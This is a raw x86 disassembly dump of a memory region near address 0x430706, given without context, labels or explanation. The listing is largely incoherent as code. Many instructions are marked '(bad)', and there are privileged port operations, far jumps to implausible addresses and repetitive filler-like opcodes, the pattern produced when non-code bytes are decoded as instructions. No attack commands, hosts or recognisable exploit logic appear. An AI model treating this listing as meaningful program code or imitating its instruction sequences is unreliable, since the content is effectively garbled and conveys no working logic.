  430706:	mov    ecx,0xff002d
  43070b:	inc    DWORD PTR [ecx-0x7cffde01]
  430711:	fdivr  DWORD PTR [ebx-0x7c34ff64]
  430717:	jbe    0x430718
  430719:	inc    DWORD PTR [eax]
  43071b:	jmp    DWORD PTR [ebx]
  43071d:	add    BYTE PTR [esi+0x0],ch
  430720:	and    DWORD PTR [ebx-0x69ffe683],0x18
  430727:	sbb    al,0x0
  430729:	add    BYTE PTR [eax],al
  43072b:	(bad)  
  43072c:	in     eax,dx
  43072d:	jmp    DWORD PTR [edx-0x2af50077]
  430733:	mov    ecx,0xee105a00
  430738:	add    bh,bh
  43073a:	mov    DWORD PTR [eax],eax
  43073c:	mov    eax,0xffff7fff
  430741:	icebp  
  430742:	stc    
  430743:	sub    bh,bh
  430745:	sub    eax,0x8383e116
  43074a:	inc    DWORD PTR [ebx-0x8100b1]
  430750:	add    cl,dh
  430752:	in     al,0xba
  430754:	sub    esi,0xfffffff5
  430757:	cld    
  430758:	add    BYTE PTR [eax],al
  43075a:	add    DWORD PTR [eax],0x4b
  43075d:	call   FWORD PTR [ecx]
  43075f:	add    bh,bh
  430761:	leave  
  430762:	adc    BYTE PTR [ebx],al
  430764:	push   ebp
  430766:	mov    ebp,0xff006e
  43076b:	or     ecx,0xffffffff
  43076e:	mov    DWORD PTR [eax],eax
  430770:	call   DWORD PTR [edi+0x1d008ef7]
  430776:	(bad)  
  430777:	sar    bh,1
  430779:	inc    DWORD PTR [eax]
  43077b:	add    DWORD PTR [eax-0x76ff5100],0xffffffd6
  430782:	shr    BYTE PTR [edi+edi*8],cl
  430785:	push   esi
  430786:	fcmovu st,st(4)
  430788:	mov    DWORD PTR [eax],eax
  43078a:	mov    DWORD PTR [ebx-0x21ff6d],eax
  430790:	int3   
  430791:	jae    0x4307e9
  430793:	inc    edi
  430794:	add    BYTE PTR [ebx+0x18],cl
  430797:	ret    0xffff
  43079a:	add    BYTE PTR [eax],al
  43079c:	idiv   edi
  43079e:	mov    ebp,0xd027ccff
  4307a3:	jns    0x4307a4
  4307a5:	dec    edi
  4307a6:	sti    
  4307a7:	fdivr  st,st(7)
  4307a9:	inc    DWORD PTR [ebx-0x4768701]
  4307af:	add    BYTE PTR [ebx-0xb675a],al
  4307b5:	mov    esp,0x830054a1
  4307ba:	(bad)  
  4307bb:	push   DWORD PTR [esi-0x1]
  4307be:	push   ecx
  4307bf:	cmp    edi,0xa
  4307c2:	imul   BYTE PTR [ecx+0x5c730eff]
  4307c8:	mov    edi,edi
  4307ca:	(bad)  
  4307cb:	jmp    FWORD PTR [edx-0x1]
  4307ce:	inc    DWORD PTR es:[eax]
  4307d1:	sub    BYTE PTR [edi-0x1153ff53],dh
  4307d7:	jg     0x4307d8
  4307d9:	(bad)  
  4307da:	dec    DWORD PTR [ecx-0x800b1]
  4307e0:	add    BYTE PTR [edx-0x78000c80],ch
  4307e6:	pushf  
  4307e7:	out    dx,al
  4307e8:	add    BYTE PTR [ecx+0xdbffff],cl
  4307ee:	adc    al,BYTE PTR [ebx-0x42e5a301]
  4307f4:	adc    DWORD PTR ds:0x83ff41cd,0xffffffff
  4307fb:	cmp    DWORD PTR [esi],0xffffffff
  4307fe:	dec    ebp
  4307ff:	inc    DWORD PTR [eax]
  430801:	rol    BYTE PTR [edx+0x13],cl
  430804:	sub    ecx,0xffffffc9
  430807:	push   edx
  430808:	int3   
  430809:	inc    DWORD PTR [ebx-0x48ff187d]
  43080f:	add    BYTE PTR [eax],al
  430811:	scas   eax,DWORD PTR es:[edi]
  430812:	jmp    0x1fd78b8f
  430817:	jg     0x430818
  430819:	inc    DWORD PTR [eax]
  43081b:	jmp    eax
  43081d:	add    bh,al
  43081f:	add    bh,bh
  430821:	push   cs
  430822:	mov    ebp,0xf67283d5
  430827:	inc    ebx
  430828:	int3   
  430829:	(bad)  
  43082a:	(bad)  
  43082b:	call   edx
  43082d:	add    BYTE PTR [ebx-0x1],al
  430830:	add    BYTE PTR [ebp+0x24ffb73a],dh
  430836:	stc    
  430837:	pop    ss
  430838:	add    BYTE PTR [ebx+0xd7ccff],al
  43083e:	mov    edi,edi
  430840:	add    BYTE PTR [esi-0xeff657b],dl
  430846:	dec    esp
  430847:	xchg   bh,bh
  430849:	add    bh,bh
  43084b:	or     esp,0xffffffff
  43084e:	loop   0x43084f
  430850:	add    DWORD PTR [ebx-0x7ff5e80],0xffffffd0
  430857:	mov    bh,bh
  430859:	(bad)  
  43085a:	(bad)  
  43085b:	inc    edi
  43085d:	add    DWORD PTR [edi-0x1],0xffffffff
  430861:	rol    DWORD PTR [edx+0x2a],0x89
  430865:	push   ds
  430866:	and    eax,ebx
  430868:	inc    DWORD PTR [ebx-0x37634]
  43086e:	pop    ebp
  43086f:	(bad)  
  430870:	push   DWORD PTR [edi-0xf009e27]
  430876:	daa    
  430877:	cwde   
  430878:	(bad)  
  430879:	(bad)  
  43087a:	(bad)  
  43087b:	call   FWORD PTR [eax-0x77]
  43087e:	mov    es,WORD PTR [eax]
  430880:	and    ebx,0x4c
  430883:	jbe    0x430884
  430885:	inc    ecx
  430886:	nop
  430887:	cli    
  430888:	add    BYTE PTR [eax],al
  43088a:	(bad)  
  43088b:	push   DWORD PTR [ebx+0x0]
  43088e:	xchg   ebx,eax
  43088f:	(bad)  
  430890:	inc    DWORD PTR [eax-0x4b008895]
  430896:	adc    ecx,eax
  430898:	add    BYTE PTR [eax],al
  43089a:	inc    DWORD PTR [eax]
  43089c:	or     al,0xff
  43089e:	in     eax,dx
  43089f:	inc    DWORD PTR [ebx-0x7c6c373e]
  4308a5:	cmp    eax,DWORD PTR [ebx-0x7c00ffa7]
  4308ab:	mov    edi,esi
  4308ad:	(bad)  
  4308ae:	cld    
  4308af:	add    BYTE PTR [eax],al
  4308b1:	shr    DWORD PTR [esi+0x54],1
  4308b4:	and    DWORD PTR [esi+0x28],0xfffffffc
  4308b8:	inc    DWORD PTR [eax]
  4308ba:	int3   
  4308bb:	int3   
  4308bc:	pop    ecx
  4308bd:	add    BYTE PTR [eax+0x9ecffcc],ah
  4308c3:	out    dx,eax
  4308c4:	push   DWORD PTR [eax+ebx*2-0x7e]
  4308c8:	inc    DWORD PTR [eax]
  4308ca:	inc    DWORD PTR [eax]
  4308cc:	pop    ebx
  4308cd:	add    BYTE PTR [ecx-0x7d],cl
  4308d0:	add    BYTE PTR [ebx+0x5aff665d],al
  4308d6:	outs   dx,DWORD PTR ds:[esi]
  4308d7:	push   ebp
  4308d8:	add    ah,cl
  4308da:	cmp    edi,0x23
  4308dd:	int3   
  4308de:	ss (bad) 
  4308e0:	(bad)  
  4308e1:	jl     0x4308de
  4308e3:	mov    BYTE PTR [ebx+0x635706],0xcc
  4308ea:	add    ah,cl
  4308ec:	fld    DWORD PTR [ebx+0x2affcc76]
  4308f2:	jb     0x4308e7
  4308f4:	adc    DWORD PTR [edx+0x27],0x18
  4308f8:	add    BYTE PTR [eax],al
  4308fa:	inc    DWORD PTR [eax]
  4308fc:	dec    DWORD PTR [bp+di-0x1]
  430901:	sub    DWORD PTR [eax],eax
  430903:	add    edi,edi
  430905:	mov    esp,0xccff4d02
  43090a:	add    bh,bh
  43090c:	pop    ebx
  43090d:	inc    DWORD PTR [ecx-0x1]
  430910:	call   DWORD PTR ds:0x6f89e7d0
  430916:	popf   
  430917:	push   edx
  430918:	add    bh,bh
  43091a:	add    bh,bh
  43091c:	inc    ecx
  43091d:	inc    DWORD PTR [edi-0x1]
  430920:	call   FWORD PTR [edx]
  430922:	mov    esi,0xfb000021
  430927:	sti    
  430928:	mov    DWORD PTR [ebx-0x9a007d],eax
  43092e:	adc    bh,bh
  430930:	mov    DWORD PTR ds:0x39003017,ebp
  430936:	popa   
  430937:	mov    esi,0xff000089
  43093c:	(bad)  
  43093d:	(bad)  
  43093e:	sti    
  43093f:	add    bh,bh
  430941:	inc    ebx
  430942:	mov    esp,0x99a600f7
  430947:	lods   eax,DWORD PTR ds:[esi]
  430948:	int3   
  430949:	add    bh,bh
  43094b:	call   DWORD PTR [ecx]
  43094d:	int3   
  43094e:	clc    
  43094f:	add    BYTE PTR [ebx-0x7c7e7ee5],al
  430955:	test   DWORD PTR ds:0xff83ffeb,0x1fff7f00
  43095f:	dec    esp
  430961:	mov    al,ds:0x4bffd80b
  430966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430967:	imul   ecx,esp,0x83ff00ff
  43096d:	(bad)  
  43096e:	cmp    al,BYTE PTR [eax]
  430970:	mov    DWORD PTR [eax+0x76],eax
  430973:	mov    DWORD PTR [ebx+0x433128],eax
  430979:	add    bh,bh
  43097b:	add    BYTE PTR [edi],ah
  43097d:	add    BYTE PTR [eax],bh
  43097f:	(bad)  
  430980:	jmp    DWORD PTR [edi-0x57]
  430983:	das    
  430984:	mov    DWORD PTR [ecx],esi
  430986:	lds    ebp,FWORD PTR [edi+edi*8+0x0]
  43098a:	(bad)  
  43098b:	inc    ebp
  43098d:	add    BYTE PTR [eax-0x33fcff77],bh
  430993:	inc    edi
  430994:	add    ah,ah
  430996:	rcl    dh,cl
  430998:	dec    esp
  43099a:	add    DWORD PTR [eax],0xffffffe6
  43099d:	add    BYTE PTR [esp+ecx*8-0x486e3301],bl
  4309a4:	mov    DWORD PTR [ecx+esi*4-0x75],esp
  4309ab:	push   edi
  4309ad:	mov    edi,ecx
  4309af:	add    bh,bh
  4309b1:	fsub   st,st(3)
  4309b3:	fiadd  DWORD PTR [eax]
  4309b5:	or     al,0x9e
  4309b7:	in     eax,dx
  4309b8:	add    ah,cl
  4309ba:	int3   
  4309bb:	call   FWORD PTR [ebx+0x0]
  4309be:	jge    0x4309c0
  4309c0:	or     DWORD PTR [eax+0x30],0xffffff82
  4309c4:	add    BYTE PTR [edi+ecx*8-0x1b],bl
  4309cb:	jmp    esp
  4309cd:	jmp    edi
  4309cf:	add    ah,cl
  4309d1:	pop    edi
  4309d2:	inc    ebx
  4309d3:	or     DWORD PTR [ecx-0x33c858a0],0xffffffff
  4309da:	add    bh,bh
  4309dc:	das    
  4309dd:	(bad)  
  4309de:	fdivp  st(7),st
  4309e0:	add    BYTE PTR [ebx+edx*4-0x4f8800b5],cl
  4309e7:	or     eax,DWORD PTR [eax]
  4309e9:	(bad)  
  4309ea:	inc    DWORD PTR [eax]
  4309ec:	dec    esi
  4309ed:	add    BYTE PTR [esi-0x2e3e0100],ch
  4309f3:	xchg   edi,eax
  4309f4:	sub    DWORD PTR [edi],0x35
  4309f7:	pop    es
  4309f8:	add    BYTE PTR [eax],al
  4309fa:	add    bh,bh
  4309fc:	sbb    edi,edi
  4309fe:	pop    esp
  4309ff:	add    DWORD PTR [ebx-0x71eeac],0xffffffe4
  430a06:	ins    DWORD PTR es:[edi],dx
  430a07:	dec    eax
  430a08:	add    bh,bh
  430a0a:	inc    DWORD PTR [ebx-0x76ac0051]
  430a10:	jmp    DWORD PTR ds:0x5e830d20
  430a16:	and    DWORD PTR [eax+eax*1-0x31ff0034],eax
  430a1d:	mov    DWORD PTR [ebp-0x1],ecx
  430a20:	add    BYTE PTR [esi+0x22cce515],ah
  430a26:	adc    BYTE PTR [edi-0x77],0x83
  430a2a:	inc    DWORD PTR [eax]
  430a2c:	mov    dl,0x83
  430a2e:	jecxz  0x4309fc
  430a30:	int3   
  430a31:	not    DWORD PTR [ebx]
  430a33:	jb     0x430a01
  430a35:	add    BYTE PTR gs:[eax-0x76ff7c01],bh
  430a3c:	rol    DWORD PTR [eax],0x66
  430a3f:	(bad)  
  430a40:	(bad)  
  430a41:	jmp    0x2942655c
  430a46:	pop    ds
  430a47:	pop    ecx
  430a48:	add    BYTE PTR [ecx+0x450000],cl
  430a4e:	aam    0xff
  430a50:	xor    DWORD PTR [esi-0x23],0x51
  430a54:	jmp    FWORD PTR [eax-0xbf7d]
  430a5a:	(bad)  
  430a5b:	inc    DWORD PTR [ecx+0x0]
  430a5e:	out    0xcc,eax
  430a60:	jmp    DWORD PTR ds:0xb989a93c
  430a66:	sub    al,0xbc
  430a68:	or     esp,0x0
  430a6b:	int3   
  430a6c:	jg     0x430a6d
  430a6e:	xchg   ebx,eax
  430a6f:	(bad)  
  430a70:	(bad)  
  430a71:	mov    ebx,0x9c00e97c
  430a76:	jo     0x430ab6
  430a78:	add    ah,cl
  430a7a:	add    bh,bh
  430a7c:	(bad)  
  430a7e:	or     al,0xff
  430a80:	mov    DWORD PTR [ecx+0x57834d1d],ecx
  430a86:	dec    ebx
  430a87:	adc    edi,edi
  430a89:	inc    DWORD PTR [ebx+0xb834683]
  430a8f:	add    BYTE PTR [ebx-0x3386e986],al
  430a95:	lahf   
  430a96:	lock xchg DWORD PTR [ebx-0x4c00ff01],eax
  430a9d:	add    dl,ch
  430a9f:	mov    esp,ecx
  430aa1:	call   FWORD PTR [eax]
  430aa3:	push   ss
  430aa4:	add    BYTE PTR [eax+0x5928],dl
  430aaa:	add    BYTE PTR [ebx-0x490032],al
  430ab0:	xor    DWORD PTR [ecx+0x33],0x36
  430ab4:	add    DWORD PTR [edx-0x20],0xffffffc2
  430ab8:	add    bh,bh
  430aba:	mov    DWORD PTR [eax],eax
  430abc:	jae    0x430a8a
  430abe:	sbb    edi,edi
  430ac0:	dec    ebp
  430ac2:	jp     0x430a8a
  430ac4:	add    BYTE PTR [eax],bh
  430ac6:	push   ecx
  430ac7:	pop    eax
  430ac8:	mov    edi,edi
  430aca:	add    bh,bh
  430acc:	sub    bh,bh
  430ace:	dec    ah
  430ad0:	sub    DWORD PTR [esi-0x4d7c37ab],0xffffff85
  430ad7:	push   es
  430ad8:	add    BYTE PTR [eax],al
  430ada:	int3   
  430adb:	add    BYTE PTR [ecx],al
  430add:	xor    DWORD PTR [esi-0x7d],0x0
  430ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430ae2:	leave  
  430ae3:	dec    edx
  430ae4:	add    bh,dl
  430ae6:	lea    ebp,[ebp-0x337c0001]
  430aec:	fcos   
  430aee:	xchg   edi,eax
  430aef:	inc    DWORD PTR [ebx-0x74a84f]
  430af5:	stos   DWORD PTR es:[edi],eax
  430af6:	fmul   DWORD PTR [esp+ecx*8]
  430af9:	int3   
  430afa:	(bad)  
  430afb:	push   ebx
  430afd:	add    BYTE PTR [edi-0x5d523334],al
  430b03:	(bad)  
  430b04:	call   FWORD PTR [esi-0x24]
  430b07:	mov    esp,0xff
  430b0c:	cmp    al,BYTE PTR [eax]
  430b0e:	sub    edi,edi
  430b10:	inc    esp
  430b12:	add    eax,0xd4c7ff4f
  430b17:	cmp    bh,0xff
  430b1a:	(bad)  
  430b1b:	jmp    FWORD PTR ds:0xcc8355ff
  430b21:	test   BYTE PTR [ecx],0x15
  430b24:	(bad)  
  430b25:	fstp   QWORD PTR [ebx]
  430b27:	pop    edx
  430b28:	add    BYTE PTR [eax],al
  430b2a:	int3   
  430b2b:	mov    DWORD PTR [eax-0x7cffe877],ecx
  430b31:	jmp    0x10c5:0xc8ff317f
  430b38:	inc    DWORD PTR [eax]
  430b3a:	cmp    edi,0xffffffbc
  430b3d:	sub    DWORD PTR [esp+ecx*8+0x0],0x7f
  430b42:	inc    edx
  430b43:	call   0xff89:0x984372cc
  430b4a:	mov    DWORD PTR [eax],eax
  430b4c:	push   cs
  430b4d:	or     eax,0xffffffff
  430b50:	jmp    ebx
  430b52:	fmul   QWORD PTR [ebp-0x1]
  430b55:	sbb    DWORD PTR [ebx-0x7cfff0],0x0
  430b5c:	pop    ds
  430b5d:	(bad)  
  430b5e:	mov    ebx,0x22618300
  430b63:	fwait
  430b64:	(bad)  
  430b65:	mov    ebx,0xff0043db
  430b6a:	cmp    edi,0x54
  430b6d:	inc    DWORD PTR [edi]
  430b6f:	inc    DWORD PTR [eax]
  430b71:	aad    0xc8
  430b73:	ins    BYTE PTR es:[edi],dx
  430b74:	dec    DWORD PTR [ebp+0x47]
  430b77:	xor    eax,0xff83cc
  430b7c:	add    eax,DWORD PTR [eax]
  430b7e:	test   eax,0x39340000
  430b83:	mov    eax,DWORD PTR [eax]
  430b85:	sub    ebx,ebp
  430b87:	mov    esp,0xffcc00ff
  430b8c:	jmp    0xcb59:0xcc00a000
  430b93:	push   edi
  430b94:	dec    DWORD PTR [eax-0x60]
  430b97:	jns    0x430b1c
  430b99:	inc    DWORD PTR [ebx-0x67ce400]
  430b9f:	inc    DWORD PTR [eax]
  430ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430ba2:	pop    edx
  430ba3:	sub    al,0xff
  430ba5:	arpl   WORD PTR [ebp-0x7c000044],bx
  430bab:	add    BYTE PTR [edi+edi*8+0x54],bh
  430baf:	cmp    edi,0x25
  430bb2:	loope  0x430c15
  430bb4:	add    BYTE PTR [ebx+edi*8-0x3333ff8a],bh
  430bbb:	add    BYTE PTR [edx-0x7d],bh
  430bbe:	loop   0x430bc0
  430bc0:	jmp    DWORD PTR [ebx-0x547c9150]
  430bc6:	fisttp WORD PTR [edi]
  430bc8:	inc    DWORD PTR [eax]
  430bca:	add    bh,bh
  430bcc:	sub    al,0xff
  430bce:	adc    BYTE PTR [ebx+0x6c133d00],al
  430bd4:	int3   
  430bd5:	jg     0x430b5b
  430bd7:	fs (bad) 
  430bd9:	inc    DWORD PTR [eax]
  430bdb:	(bad)  
  430bdc:	jns    0x430b61
  430bde:	ret    0xff00
  430be1:	xchg   ebp,eax
  430be2:	xchg   edx,eax
  430be3:	into   
  430be4:	add    BYTE PTR [ebx],ch
  430be6:	xchg   ebx,eax
  430be7:	lods   eax,DWORD PTR ds:[esi]
  430be8:	inc    DWORD PTR [eax]
  430bea:	(bad)  
  430beb:	push   DWORD PTR [ecx+0x0]
  430bee:	popf   
  430bef:	(bad)  
  430bf0:	dec    edi
  430bf2:	(bad)  
  430bf3:	je     0x430bc1
  430bf5:	cmp    bh,0xff
  430bf8:	add    DWORD PTR [eax],0x0
  430bfb:	(bad)  
  430bfc:	dec    esp
  430bfe:	inc    DWORD PTR [eax]
  430c00:	xlat   BYTE PTR ds:[ebx]
  430c01:	push   DWORD PTR [ebp+0xebf483]
  430c07:	jmp    esi
  430c09:	or     DWORD PTR [eax],0xffffff89
  430c0c:	cmp    ch,ch
  430c0e:	add    bh,bh
  430c10:	push   ss
  430c11:	add    BYTE PTR [ebp-0x1],cl
  430c14:	add    eax,DWORD PTR [eax+0x0]
  430c17:	call   FWORD PTR [edi-0x5476ca7d]
  430c1d:	out    0x83,al
  430c1f:	push   DWORD PTR [edi+0x5affca89]
  430c25:	mov    ecx,0x37cc00
  430c2a:	jle    0x430bf8
  430c2c:	fcomp  QWORD PTR [edi-0x3b0000]
  430c32:	fiadd  WORD PTR [ebx-0x7813]
  430c38:	aaa    
  430c39:	add    BYTE PTR [ecx-0xf22700],dh
  430c3f:	mov    DWORD PTR [ebp-0x1],esp
  430c42:	and    WORD PTR [edx-0x5f],0xffff
  430c47:	int3   
  430c48:	ja     0x430c4a
  430c4a:	inc    edi
  430c4b:	add    BYTE PTR [esp+eax*8-0xb2ff01],ah
  430c52:	cmp    BYTE PTR [ebx-0x33c530],al
  430c58:	(bad)  
  430c59:	(bad)  
  430c5a:	jns    0x430c5c
  430c5c:	sub    eax,0x1acccc2b
  430c61:	mov    DWORD PTR [ebx],ebp
  430c63:	mov    esi,esp
  430c65:	(bad)  
  430c66:	(bad)  
  430c67:	dec    edx
  430c69:	add    BYTE PTR [eax],bh
  430c6b:	dec    DWORD PTR [edx+0x3f0083df]
  430c71:	add    BYTE PTR [ecx+ecx*4+0x6f],dl
  430c75:	push   esi
  430c76:	add    DWORD PTR [eax],0x77
  430c79:	call   DWORD PTR [ebx+0x0]
  430c7c:	xor    eax,0x6f000031
  430c81:	(bad)  
  430c82:	cld    
  430c83:	xor    DWORD PTR [ecx],0xffffff93
  430c86:	(bad)  
  430c87:	dec    DWORD PTR [ecx]
  430c89:	call   ecx
  430c8b:	inc    DWORD PTR [ebx]
  430c8d:	or     BYTE PTR [eax],al
  430c8f:	(bad)  
  430c90:	std    
  430c91:	add    BYTE PTR [esi-0x370901],bh
  430c97:	add    BYTE PTR [eax],bl
  430c99:	int3   
  430c9a:	xor    al,0x83
  430c9c:	push   es
  430c9d:	pop    ebx
  430c9e:	add    ah,cl
  430ca0:	cli    
  430ca1:	add    BYTE PTR [edi+edi*8-0x7c8f4f],dl
  430ca8:	repz call DWORD PTR [edi]
  430cab:	(bad)  
  430cac:	(bad)  [esi-0xa7ff34]
  430cb2:	xor    BYTE PTR [eax],al
  430cb4:	cmp    cl,BYTE PTR ds:0xd38383
  430cba:	ror    ah,cl
  430cbc:	test   al,0xcf
  430cbe:	inc    DWORD PTR [eax]
  430cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430cc1:	jmp    FWORD PTR [edx-0x34]
  430cc4:	popa   
  430cc5:	inc    edi
  430cc6:	cmp    edi,0xffffffc2
  430cc9:	jmp    FWORD PTR [eax+eax*1+0x3e]
  430ccd:	or     edi,edi
  430ccf:	jmp    FWORD PTR [edi+edi*8-0x18cd7c6f]
  430cd6:	inc    DWORD PTR [eax]
  430cd8:	int    0xff
  430cda:	sbb    edi,edi
  430cdc:	das    
  430cdd:	pop    es
  430cde:	mov    DWORD PTR [eax],eax
  430ce0:	xor    al,0xff
  430ce2:	sub    al,BYTE PTR [eax]
  430ce4:	imul   dh
  430ce6:	dec    esp
  430ce8:	mov    BYTE PTR [ebx-0x3183007a],0x0
  430cef:	add    BYTE PTR [ecx],al
  430cf1:	sub    edi,0xffffffff
  430cf4:	je     0x430cb4
  430cf6:	inc    DWORD PTR [eax]
  430cf8:	in     eax,0xff
  430cfa:	dec    esi
  430cfb:	or     DWORD PTR [ecx-0x63],0xffffffff
  430cff:	inc    DWORD PTR [ebp+0x54ff4aff]
  430d05:	cmp    BYTE PTR [ebx+0x1dffeaff],al
  430d0b:	mov    DWORD PTR [eax],esi
  430d0d:	call   0x11c0c95
  430d12:	enter  0x3283,0x45
  430d16:	cmp    edi,0xffffffd5
  430d19:	add    BYTE PTR [edx+0x0],bl
  430d1c:	dec    edi
  430d1d:	add    eax,DWORD PTR [eax]
  430d1f:	jmp    FWORD PTR [edi-0xeff7a00]
  430d25:	ins    BYTE PTR es:[edi],dx
  430d26:	mov    DWORD PTR [eax],eax
  430d28:	je     0x430d29
  430d2a:	iret   
  430d2b:	push   ebx
  430d2d:	mov    eax,0xffe70000
  430d32:	sub    bh,bh
  430d34:	pop    ebx
  430d35:	enter  0xff,0x44
  430d39:	inc    DWORD PTR [edx-0x1]
  430d3c:	fimul  DWORD PTR [edi]
  430d3e:	dec    DWORD PTR [ecx-0x97cb0]
  430d44:	and    eax,0x4000ffef
  430d49:	int3   
  430d4a:	pop    es
  430d4b:	add    cl,ch
  430d4d:	aaa    
  430d4e:	inc    DWORD PTR [ebx-0x33000024]
  430d54:	rcl    BYTE PTR [esi],cl
  430d56:	(bad)  
  430d57:	dec    DWORD PTR [esi-0x1f00cc01]
  430d5d:	add    al,0x0
  430d5f:	jmp    DWORD PTR [esi]
  430d61:	add    BYTE PTR [edx],cl
  430d63:	(bad)  
  430d64:	cmp    edi,edi
  430d66:	int3   
  430d67:	cmp    DWORD PTR [eax+eax*1],0xd
  430d6b:	jmp    FWORD PTR [eax+0x35ffcc60]
  430d71:	inc    ebp
  430d73:	add    BYTE PTR [eax],ch
  430d75:	fdivp  st(7),st
  430d77:	jmp    FWORD PTR [ecx-0x7d]
  430d7a:	sbb    eax,0xd95283
  430d7f:	sub    DWORD PTR [esi+0x0],0xffffffa8
  430d83:	push   DWORD PTR [ebx-0x6d7600bf]
  430d89:	mov    DWORD PTR [esi+0xd69fff],eax
  430d8f:	(bad)  
  430d90:	inc    DWORD PTR [eax]
  430d92:	ret    0x7f83
  430d95:	sti    
  430d96:	or     esp,0xffffffe2
  430d99:	mov    DWORD PTR [eax-0x1],ebp
  430d9c:	sbb    al,0x51
  430d9e:	inc    DWORD PTR [ebx+0x34cc59]
  430da4:	call   0x51430d27
  430da9:	(bad)  
  430daa:	clc    
  430dab:	adc    DWORD PTR [esi+0x22ff8390],0xffffffcc
  430db2:	xchg   edi,eax
  430db3:	add    ah,dl
  430db5:	js     0x430d3a
  430db7:	jmp    FWORD PTR [ebx]
  430db9:	add    BYTE PTR [eax+0x0],ah
  430dbc:	pusha  
  430dbd:	xchg   edi,eax
  430dbe:	add    DWORD PTR [eax],0xffffffec
  430dc1:	add    al,bh
  430dc3:	add    BYTE PTR [edx+0x5dffffbf],bh
  430dc9:	jmp    FWORD PTR [esi]
  430dcb:	call   DWORD PTR [ecx+0x8fffff2]
  430dd1:	add    BYTE PTR [edi-0x314101],al
  430dd7:	add    BYTE PTR [esi-0x10001b01],ch
  430ddd:	retf   0x83ff
  430de0:	inc    esp
  430de1:	add    BYTE PTR [ebx-0x1],ah
  430de4:	sub    al,0xb4
  430de6:	int3   
  430de7:	add    BYTE PTR [edx+0x0],cl
  430dea:	jmp    0x430d6f
  430dec:	dec    ecx
  430dee:	cmp    edi,0xffffffd4
  430df1:	(bad)  
  430df2:	jns    0x430df4
  430df4:	mov    esp,0x1fffffe3
  430df9:	dec    eax
  430dfb:	add    BYTE PTR [ecx+0x4d],bl
  430dfe:	add    BYTE PTR [eax],al
  430e00:	cwde   
  430e01:	add    BYTE PTR [eax],ch
  430e03:	add    al,cl
  430e05:	jmp    0x843c0e8d
  430e0a:	pop    eax
  430e0b:	jmp    FWORD PTR [esi]
  430e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430e0e:	mov    edi,edi
  430e10:	xchg   ebx,eax
  430e11:	dec    DWORD PTR ds:0xf22e89
  430e17:	add    BYTE PTR [edx+0x0],ch
  430e1a:	(bad)  
  430e1d:	popf   
  430e1e:	mov    edi,edi
  430e20:	push   0x64004100
  430e25:	mov    eax,DWORD PTR [eax]
  430e27:	add    BYTE PTR [eax-0xf331400],dh
  430e2d:	retf   0xff00
  430e30:	dec    ebp
  430e31:	call   DWORD PTR [eax+0x0]
  430e34:	in     eax,dx
  430e35:	leave  
  430e36:	add    DWORD PTR [ebx-0xaa7c7e],0xffffffa4
  430e3d:	pop    ss
  430e3e:	int3   
  430e3f:	add    ch,ah
  430e41:	mov    DWORD PTR [edx+0x0],esp
  430e44:	inc    ebx
  430e45:	inc    DWORD PTR [bx+si]
  430e48:	xor    eax,0x5889d2cc
  430e4d:	sub    edi,edi
  430e4f:	mov    ebx,ebx
  430e51:	and    edi,0xffffffff
  430e54:	fld    DWORD PTR [edi+0x98ff00]
  430e5a:	pop    esi
  430e5b:	jmp    ecx
  430e5d:	(bad)  
  430e5e:	add    BYTE PTR [eax],al
  430e60:	mov    es,WORD PTR [ebx+0x6b42cc3c]
  430e66:	int3   
  430e67:	add    BYTE PTR [edi-0x21fff734],dh
  430e6d:	in     eax,0x0
  430e6f:	dec    ebp
  430e71:	add    BYTE PTR [esi],al
  430e73:	add    BYTE PTR [esp+ebp*1+0x0],bh
  430e77:	int3   
  430e78:	jmp    0xbc43e67c
  430e7d:	xlat   BYTE PTR ds:[ebx]
  430e7e:	inc    DWORD PTR [eax]
  430e80:	repz call DWORD PTR [ebx+0x0]
  430e84:	xor    al,0xcf
  430e86:	int3   
  430e87:	(bad)  
  430e88:	in     eax,dx
  430e89:	add    ch,cl
  430e8b:	and    esi,0x71
  430e8e:	cmp    edi,0xffffffc9
  430e91:	int3   
  430e92:	xor    edi,edi
  430e94:	pop    ss
  430e95:	pop    edi
  430e96:	(bad)  
  430e97:	inc    DWORD PTR [edx]
  430e99:	sbb    edi,0xffffff83
  430e9c:	xor    dh,BYTE PTR [ebp-0xc3ff7d]
  430ea2:	mov    ds:0x83d6fcff,eax
  430ea7:	sub    DWORD PTR [edx-0x7d],0xffffff9f
  430eab:	adc    edi,0x2d
  430eae:	add    BYTE PTR [eax],al
  430eb0:	xor    eax,0x78835bff
  430eb5:	cmp    BYTE PTR [eax],al
  430eb7:	jmp    FWORD PTR [esi-0x1]
  430eba:	aad    0x83
  430ebc:	xchg   edx,eax
  430ebd:	dec    edx
  430ebe:	add    bh,bh
  430ec0:	pop    esp
  430ec1:	add    BYTE PTR [edi-0x1],al
  430ec4:	jge    0x430e72
  430ec6:	int3   
  430ec7:	(bad)  
  430ec8:	mov    edx,0x1f8336ff
  430ecd:	les    eax,FWORD PTR [eax]
  430ecf:	dec    DWORD PTR [eax-0x7d]
  430ed2:	add    edi,edi
  430ed4:	xor    BYTE PTR [edi-0x1],dh
  430ed7:	jmp    DWORD PTR [edi+0x0]
  430eda:	fdivp  st(7),st
  430edc:	shr    BYTE PTR [ecx-0x1],0xff
  430ee0:	inc    ebp
  430ee1:	jmp    DWORD PTR [ebx]
  430ee3:	call   FWORD PTR [ebx]
  430ee5:	scas   al,BYTE PTR es:[edi]
  430ee6:	inc    DWORD PTR [ebx-0x330733dc]
  430eec:	imul   edx,DWORD PTR [ecx],0xffb8ffff
  430ef2:	xchg   esp,eax
  430ef3:	xor    DWORD PTR ds:0x56ff8360,0xffffffcc
  430efa:	add    DWORD PTR [ebx-0x7c00e089],eax
  430f00:	fild   DWORD PTR [eax]
  430f02:	dec    edi
  430f03:	int3   
  430f04:	pusha  
  430f05:	xchg   esp,eax
  430f06:	add    BYTE PTR [eax],al
  430f08:	rol    BYTE PTR [eax],0x68
  430f0b:	call   DWORD PTR [edx+0xe8389f2]
  430f11:	int3   
  430f12:	lock add BYTE PTR [ebx],ah
  430f15:	idiv   edi
  430f17:	call   FWORD PTR [eax]
  430f19:	mov    DWORD PTR [eax+0x0],esi
  430f1c:	(bad)  
  430f1d:	fadd   DWORD PTR [ebx-0x6001301]
  430f23:	call   FWORD PTR [edi]
  430f25:	mov    ebp,0xff39cc83
